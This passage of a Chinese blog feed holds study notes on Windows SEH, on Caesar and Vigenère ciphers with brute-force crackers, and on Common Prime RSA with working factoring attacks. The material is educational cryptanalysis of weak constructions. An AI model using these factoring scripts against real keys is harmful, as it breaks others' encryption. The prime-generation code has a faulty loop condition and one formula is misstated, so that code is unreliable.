和 <code>EXCEPTION_CONTINUE_SEARCH</code>。</p>
<table>
<colgroup>
<col style="width: 33%">
<col style="width: 66%">
</colgroup>
<thead>
<tr class="header">
<th>宏定义常量</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>EXCEPTION_CONTINUE_EXECUTION</code></td>
<td>异常处理完毕，程序继续正常运行异常出现处的下一条指令</td>
</tr>
<tr class="even">
<td><code>EXCEPTION_EXECUTE_HANDLER</code></td>
<td>异常处理完毕，但是直接执行 <code>__except</code> 块的内容</td>
</tr>
<tr class="odd">
<td><code>EXCEPTION_CONTINUE_SEARCH</code></td>
<td>异常无法处理，告诉 Windows 寻找下一个异常处理函数来处理异常</td>
</tr>
</tbody>
</table>
<p>这里我们通常通过函数实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">ExceptionFilter</span><span class="params">(<span class="type">int</span> nRet)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nRet == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">	<span class="type">double</span> z = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Pls. input a number: &quot;</span>;</span><br><span class="line">	cin &gt;&gt; y;</span><br><span class="line"></span><br><span class="line">	__try &#123;</span><br><span class="line">		z = x / y;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;the value is &quot;</span> &lt;&lt; z &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="built_in">ExceptionFilter</span>(y)) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;could not div 0&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中我们可以通过 <code>GetExceptionCode()</code>
来获取系统所抛出的异常。</p>
<p>在 ida 中我们可以观察到，<code>__excpet</code> 被分析为：</p>
<figure>
<img src="/cexception-note/ida_view.png" alt="ida_view">
<figcaption aria-hidden="true">ida_view</figcaption>
</figure>
<h1 id="windows-veh-向量化异常处理机制">Windows VEH
向量化异常处理机制</h1>
<p>Windows VEH 向量化异常处理机制</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>c</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>凯撒加密和维吉尼亚加密的笔记</title>
    <url>//caesar-vigenere-note.html</url>
    <content><![CDATA[<h1 id="凯撒加密">凯撒加密</h1>
<h2 id="简述">简述</h2>
<p>在密码学中，恺撒密码是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。恺撒密码通常被作为其他更复杂的加密方法中的一个步骤。恺撒密码还在现代的ROT13系统中被应用。但是和所有的利用字母表进行替换的加密技术一样，凯撒密码的密度是很低的，只需简单地统计字频就可以破译。</p>
<p>需要注意的是，凯撒加密只对二十六个字母（要么都是大写，要么都是小写）有效。</p>
<h2 id="描述">描述</h2>
<p>设 <span class="math inline">\(k\)</span> 为密钥 (key)，字符串 <span class="math inline">\(m\)</span> 为明文，<span class="math inline">\(c\)</span> 为密文，则加密算法为 <span class="math display">\[
c_i=E(m_i,k)
\]</span> 其中函数 <span class="math inline">\(E\)</span> 的算法为，令
<span class="math inline">\(m_i\)</span> 向右偏移 <span class="math inline">\(k\)</span> 位，在
<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code> 字母环中移动，即 <span class="math display">\[
E(m_i,k)=(m_i+k)\ mod\ 26
\]</span> 解密算法为 <span class="math display">\[
m_i=D(c_i,k)
\]</span> 其中函数 <span class="math inline">\(D\)</span> 的算法为，令
<span class="math inline">\(c_i\)</span> 向左偏移 k 位，在
<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code> 字母环中移动，即 <span class="math display">\[
D(c_i,k)=(c_i-k)\ mod\ 26
\]</span></p>
<h2 id="实现">实现</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里只处理大写</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">CaesarChar</span><span class="params">(<span class="type">char</span> ch, <span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (ch - <span class="string">&#x27;A&#x27;</span> + k) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">CaesarEncoder</span><span class="params">(<span class="type">const</span> string&amp; plain, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(plain)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">char</span>&amp; i : result)</span><br><span class="line">	&#123;</span><br><span class="line">		i = <span class="built_in">CaesarChar</span>(i, key);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">CaesarDecoder</span><span class="params">(<span class="type">const</span> string&amp; code, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(code)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">char</span>&amp; i : result)</span><br><span class="line">	&#123;</span><br><span class="line">		i = <span class="built_in">CaesarChar</span>(i, -key);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于凯撒加密有十分简单的爆破方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对凯撒加密的单个字符爆破 key</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CaesarCharKeyCracker</span><span class="params">(<span class="type">char</span> plainChar, <span class="type">char</span> codeChar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> diff = codeChar - plainChar;</span><br><span class="line">	<span class="keyword">return</span> diff &lt; <span class="number">0</span> ? diff + <span class="number">26</span> : diff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对凯撒加密的字符串爆破 key，会核验是否满足凯撒加密</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CaesarStringKeyCracker</span><span class="params">(<span class="type">const</span> string&amp; plain, <span class="type">const</span> string&amp; code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> diff = <span class="built_in">CaesarCharKeyCracker</span>(plain[<span class="number">0</span>], code[<span class="number">0</span>]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; plain.<span class="built_in">size</span>(); ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (diff != <span class="built_in">CaesarCharKeyCracker</span>(plain[i], code[i]))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 说明极有可能不是凯撒加密</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> diff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对凯撒加密后的字符串爆破密钥 1~25 并返回结果</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">CaesarCracker</span><span class="params">(<span class="type">const</span> string&amp; code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;string&gt; result;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">26</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		result.<span class="built_in">push_back</span>(<span class="built_in">CaesarDecoder</span>(code, i));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 返回密钥从 1~25 的解密结果</span></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>爆破算法使用 python 编写则是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">CaesarCracker</span>(<span class="params">code:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="built_in">chr</span>((<span class="built_in">ord</span>(x) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(x) <span class="keyword">else</span> x, code))</span><br></pre></td></tr></table></figure>
<h1 id="维吉尼亚加密">维吉尼亚加密</h1>
<h2 id="简述-1">简述</h2>
<p>在单一恺撒密码的基础上，法国外交家布莱斯·德·维吉尼亚（Blaise de
Vigenère）发明了一种方法来对同一条信息中的不同字母用不同的密码进行加密。这样，同样的E在一个位置可能被M所取代，而在另一个位置的E则有可能以K的面目出现。这样，就可以防止任何人利用频率分析法解密该条信息。</p>
<p>维吉尼亚密码引入了“密钥”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。</p>
<figure>
<img src="/caesar-vigenere-note/vigenere%20table.png" alt="vigenere table">
<figcaption aria-hidden="true">vigenere table</figcaption>
</figure>
<h2 id="描述-1">描述</h2>
<p>与凯撒加密不同，维吉尼亚的密钥是一个只含有二十六个字母的字符串 <span class="math inline">\(key\)</span>，同理明文为 <span class="math inline">\(m\)</span>，密文为 <span class="math inline">\(c\)</span>，则加密算法为 <span class="math display">\[
c_i=E(m_i,key_i)
\]</span> 其中函数 <span class="math inline">\(E\)</span>
的算法为，在维吉尼亚表中，横行为 <span class="math inline">\(m_i\)</span> 的字符，纵行为 <span class="math inline">\(key_i\)</span>
的字符，选择对应的表中字符为加密字符。</p>
<p>解密算法为 <span class="math display">\[
m_i=D(c_i,key_i)
\]</span> 其中函数 <span class="math inline">\(D\)</span>
的算法为，在维吉尼亚表中，纵行为 <span class="math inline">\(key_i\)</span> 的字符，查找 <span class="math inline">\(key_i\)</span> 对应横行中的字符 <span class="math inline">\(c_i\)</span>，所对应的上方横行字符即为明文字符。</p>
<p>实际上就相当于每一个字符都拥有自己的 key 进行凯撒加密</p>
<h2 id="实现-1">实现</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里只处理大写</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">CaesarChar</span><span class="params">(<span class="type">char</span> ch, <span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (ch - <span class="string">&#x27;A&#x27;</span> + k) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里只处理大写</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">VigenereCharEncoder</span><span class="params">(<span class="type">char</span> ch, <span class="type">char</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">CaesarChar</span>(ch, k - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里只处理大写</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">VigenereCharDecoder</span><span class="params">(<span class="type">char</span> ch, <span class="type">char</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">CaesarChar</span>(ch, -(<span class="type">int</span>)(k - <span class="string">&#x27;A&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">VigenereStringEncoder</span><span class="params">(<span class="type">const</span> string&amp; plain, <span class="type">const</span> string&amp; key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(plain)</span></span>;</span><br><span class="line">	<span class="type">size_t</span> c = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">char</span>&amp; i : result)</span><br><span class="line">	&#123;</span><br><span class="line">		i = <span class="built_in">VigenereCharEncoder</span>(i, key[c]);</span><br><span class="line">		++c;</span><br><span class="line">		<span class="keyword">if</span> (c == key.<span class="built_in">size</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			c -= key.<span class="built_in">size</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">VigenereStringDecoder</span><span class="params">(<span class="type">const</span> string&amp; code, <span class="type">const</span> string&amp; key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(code)</span></span>;</span><br><span class="line">	<span class="type">size_t</span> c = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">char</span>&amp; i : result)</span><br><span class="line">	&#123;</span><br><span class="line">		i = <span class="built_in">VigenereCharDecoder</span>(i, key[c]);</span><br><span class="line">		++c;</span><br><span class="line">		<span class="keyword">if</span> (c == key.<span class="built_in">size</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			c -= key.<span class="built_in">size</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中对维吉尼亚密钥的爆破算法为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对凯撒加密的单个字符爆破 key</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CaesarCharKeyCracker</span><span class="params">(<span class="type">char</span> plainChar, <span class="type">char</span> codeChar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> diff = codeChar - plainChar;</span><br><span class="line">	<span class="keyword">return</span> diff &lt; <span class="number">0</span> ? diff + <span class="number">26</span> : diff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">VigenereKeyCracker</span><span class="params">(<span class="type">const</span> string&amp; plain, <span class="type">const</span> string&amp; code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">key</span><span class="params">(plain)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; plain.<span class="built_in">size</span>(); ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		key[i] = <span class="built_in">CaesarCharKeyCracker</span>(plain[i], code[i]) + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>爆破密钥的算法使用 python 编写则是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">VigenereKeyCracker</span>(<span class="params">plain:<span class="built_in">str</span>, code:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(j)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(i) <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(plain, code))</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Common Prime RSA 笔记</title>
    <url>//common-prime-rsa.html</url>
    <content><![CDATA[<h1 id="common-prime-rsa">Common Prime RSA</h1>
<h2 id="简介">简介</h2>
<p>Wiener 提出，如果 <span class="math inline">\(p\)</span> 和 <span class="math inline">\(q\)</span> 是素数，使得 <span class="math inline">\(p-1\)</span> 和 <span class="math inline">\(q-1\)</span>
有一个大数因子，那么具有这种性质的素数可以作为 Wiener Attack
的反制措施。</p>
<p>根据这种理论，出现了一种 <span class="math inline">\(p-1\)</span> 和
<span class="math inline">\(q-1\)</span> 拥有一个共同的大素数因子的 RSA
变体，我们称作共素数RSA（Common Prime RSA）。</p>
<p>对于某个大素数 <span class="math inline">\(g\)</span>，让 <span class="math inline">\(p=2ga+1\)</span> 且 <span class="math inline">\(q=2gb+1\)</span> 作为平衡素数，保证 <span class="math inline">\(a,b\)</span> 互素且 <span class="math inline">\(h=2gab+a+b\)</span> 是素数。第一个限制确保 <span class="math inline">\(\gcd(p-1,q-1)=2g\)</span>，第二个限制确保 <span class="math inline">\((pq-1)/2=gh\)</span> 与 <span class="math inline">\(N=pq\)</span> 的大小接近。</p>
<p>因为由上述算法生成的素数 <span class="math inline">\(p,q\)</span>
满足 <span class="math inline">\(g=\gcd(p-1,q-1)\)</span>
是一个大素数因子，故称 <span class="math inline">\(p,q\)</span>
为共素数（common primes）。其中 <span class="math inline">\(g\)</span>
为这两个素数的共因子（common factor）。</p>
<p>我们需要注意到对于共素数RSA有着以下性质： <span class="math display">\[
\lambda(pq)=\mathrm{lcm}(p-1,q-1)=\mathrm{lcm}(2ga,2gb)=2gab\\
\varphi(pq)=(p-1)(q-1)=2ga2gb=2g\lambda(pq)
\]</span> 此外存在额外定义，RSA加密指数和解密指数需要与 <span class="math inline">\(\lambda(pq)\)</span> 互素。</p>
<p>根据上述定义，可以推导出 <span class="math display">\[
N=pq=(2ga+1)(2gb+1)=2g(2gab+a+b)+1=2gh+1
\]</span> 即 <span class="math inline">\(N-1\)</span> 为 <span class="math display">\[
N-1=2g(2gab+a+b)=2gh
\]</span> 定义 <span class="math inline">\(\gamma\)</span> 表示共因子
<span class="math inline">\(g\)</span> 的相对于 <span class="math inline">\(N\)</span> 的大小，即 <span class="math inline">\(g=N^\gamma\)</span>。考虑 <span class="math inline">\(g\leq N^{1/2}\)</span>，故 <span class="math inline">\(0\leq\gamma\leq1/2\)</span>。</p>
<h2 id="生成算法">生成算法</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gcd</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">nbits: <span class="built_in">int</span>, gamma: <span class="built_in">float</span></span>):</span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"><span class="built_in">print</span>(gen_prime(<span class="number">512</span>, <span class="number">0.48</span>))</span><br></pre></td></tr></table></figure>
<h2 id="攻击">攻击</h2>
<h3 id="gamma-接近于-12"><span class="math inline">\(\gamma\)</span>
接近于 <span class="math inline">\(1/2\)</span></h3>
<p>当 <span class="math inline">\(\gamma\)</span> 接近于 <span class="math inline">\(1/2\)</span> 时，<span class="math inline">\(g=N^\gamma\)</span> 接近于 <span class="math inline">\(N^{1/2}\)</span>，由于共素数RSA的特殊构造我们可以在
<span class="math inline">\(O(N^{1/4-\gamma/2})\)</span> 分解 <span class="math inline">\(N\)</span>，故此时算法时间复杂度接近于 <span class="math inline">\(O(1)\)</span>。</p>
<p>此时我们只需修改 <code>Pollard's rho method</code> 的 <span class="math inline">\(x_i\)</span> 函数。</p>
<p>在 Mckee&amp;Pinch 的论文<a href="https://citeseerx.ist.psu.edu/doc_view/pid/64294c404088b69a519614510b8d12b4809a6b10">《Further
Attacks on Server-Aided RSA Cryptosystems》</a>中指出将 <span class="math inline">\(f(x)=x^2+1\)</span> 修改为 <span class="math inline">\(f(x)=x^{N-1}+3\pmod{N}\)</span> 是最优解。</p>
<p>由于 <span class="math inline">\(N-1=2gh\)</span> 且 <span class="math inline">\(p-1=ga\)</span>，故最多只有一个值不在 <span class="math inline">\(x^{N-1}\mod{p}\)</span> 的环中。</p>
<p>算法实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gcd</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">N</span>):</span><br><span class="line">    f = <span class="keyword">lambda</span> x: (<span class="built_in">pow</span>(x, N-<span class="number">1</span>, N) + <span class="number">3</span>) % N</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 加快入环速度</span></span><br><span class="line">        t = random.randint(<span class="number">2</span>, N)</span><br><span class="line">        h = f(t)</span><br><span class="line">        step_times = <span class="number">0</span></span><br><span class="line">        step_limit = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> step_times &lt; step_limit:</span><br><span class="line">                step_times = <span class="number">0</span></span><br><span class="line">                step_limit *= <span class="number">2</span></span><br><span class="line">                t = h</span><br><span class="line">                h = f(h)</span><br><span class="line">            p = gcd(<span class="built_in">abs</span>(<span class="built_in">int</span>(t) - <span class="built_in">int</span>(h)), N)</span><br><span class="line">            <span class="keyword">if</span> p == N:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, N // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                h = f(h)</span><br><span class="line">                step_times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rho(<span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span>))</span><br></pre></td></tr></table></figure>
<p>故事实证明 <span class="math inline">\(\gamma\)</span>
值的选取不能过于接近 <span class="math inline">\(1/2\)</span>。</p>
<h3 id="已知-ab">已知 <span class="math inline">\(a,b\)</span></h3>
<p>已知 <span class="math inline">\(N=2g(2gab+a+b)+1\)</span>，于是我们构造方程 <span class="math display">\[
4abg^2+2(a+b)g-N+1=0
\]</span> 可以在多项式时间 <span class="math inline">\(\log(N)\)</span>
内分解 <span class="math inline">\(N\)</span>。</p>
<p>Sagemath 代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1185431345934512</span></span><br><span class="line">b = <span class="number">1989628969125971</span></span><br><span class="line">N = <span class="number">54692260436051338814890781701826055707958209029414126894070449935683071253184867947357262267840171428710181955973010913204514025135188192484651672240708141692701667242130748316666406528479191422804307020656050201187035928715833163999813216597718706449260040885862566373392398826670863398295350419792842640631</span></span><br><span class="line">P.&lt;g&gt; = ZZ[]</span><br><span class="line">f = <span class="number">4</span> * a * b * g ^ <span class="number">2</span> + <span class="number">2</span> * (a + b) * g - N + <span class="number">1</span></span><br><span class="line">g = f.roots()</span><br><span class="line"><span class="keyword">if</span> g:</span><br><span class="line">    g = g[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br></pre></td></tr></table></figure>
<p>Python 可以借助 <code>sympy</code> 解方程。</p>
<h3 id="已知-g">已知 <span class="math inline">\(g\)</span></h3>
<p>当 <span class="math inline">\(g\geq a+b\)</span>
时，会导致在多项式时间为 <span class="math inline">\(\log(N)\)</span>
内分解 <span class="math inline">\(N\)</span>，同时因为素数是平衡的，条件相当于 <span class="math inline">\(g&gt;N^{1/4}\)</span>。</p>
<p>证明如下：</p>
<p>我们假设 <span class="math inline">\(g&gt;a+b\)</span>，那么给予
<span class="math inline">\(N,g\)</span>，令 <span class="math inline">\(M=(N-1)/(2g)\)</span>，<span class="math inline">\(c=a+b\)</span>，那么方程 <span class="math display">\[
N=2g(2gab+a+b)+1
\]</span> 可以改写成 <span class="math display">\[
M=2gab+c
\]</span> 因为 <span class="math inline">\(c=a+b&lt;g\)</span>，根据假设，可以归约为模 <span class="math inline">\(g\)</span> 域下的方程： <span class="math display">\[
c=M\pmod{g}
\]</span> 因此，<span class="math inline">\(c=a+b\)</span>
是已知的。</p>
<p>将 <span class="math inline">\(b=c-a\)</span> 带回方程 <span class="math inline">\(N=2g(2gab+a+b)+1\)</span>，整理可得二次方程：
<span class="math display">\[
2ga^2-2gca+(N-1)/(2g)-c=0
\]</span> 可以解得 <span class="math inline">\(a,b\)</span>
为该方程两解。</p>
<p>假设 <span class="math inline">\(g=a+b\)</span>，我们将方程 <span class="math inline">\(N=2g(2gab+a+b)+1\)</span> 作等价替换，整理得到方程
<span class="math display">\[
\frac{N-1}{4g^2}=ab+\frac{1}{2}
\]</span> 我们再进一步替换 <span class="math inline">\(b=g-a\)</span>，再次整理可得二次方程： <span class="math display">\[
a^2-ga+\frac{N-1}{4g^2}-\frac{1}{2}=0
\]</span> 可以解得 <span class="math inline">\(a,b\)</span>。</p>
<p>代码如下：</p>
<p><span class="math inline">\(g&gt;a+b\)</span> 时，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="number">2056971706333850947354991471886113601423457483931388832864204860321308350537317091564919029078296379733989138742162694786565228112885684303</span></span><br><span class="line">N = <span class="number">67324909911911622626246005558967775211455024820506932698435813321567574468019013664789401988015894964099052816176029553245881317276340043887466584645914352982274378611180595397686920214079479901514703963131435008906250160656759300390805929849374653321934393399433471228218819498373221757779799476717494079667</span></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">c = M % g</span><br><span class="line">P.&lt;a&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span> * g * a ^ <span class="number">2</span> - <span class="number">2</span> * g * c * a + M - c</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br></pre></td></tr></table></figure>
<p><span class="math inline">\(g=a+b\)</span> 时，</p>
